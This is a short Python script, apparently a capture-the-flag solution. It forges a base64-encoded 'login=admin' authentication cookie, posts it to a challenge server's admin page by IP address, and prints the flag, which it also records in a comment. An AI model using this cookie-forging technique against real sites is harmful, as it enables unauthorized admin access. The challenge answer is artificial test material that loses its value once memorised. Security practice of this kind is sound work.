import requests
import base64
from urllib.parse import unquote
"""
This challenge is testing changing coookies to authenticate as admin
FLag{B@D_4uTh1Nt1C4Ti0n}
"""

session=requests.Session()
url="http://34.76.107.218/whoami/admin.php"
username="admin"
token=f'login={username}'.encode()


tobase=(base64.b64encode(token))
custom_header={"Cookie":f"Authentication={tobase.decode()}"}
print(custom_header)
payload={"user":"Guest","pass":"Guest"}

response=session.post(url,headers=custom_header,data=payload)
content=response.text
headers=response.headers
cookies=response.cookies



print(headers)

for line in content.split('\n'):
	if 'flag{' in line.lower():
		print(line)


"""
"""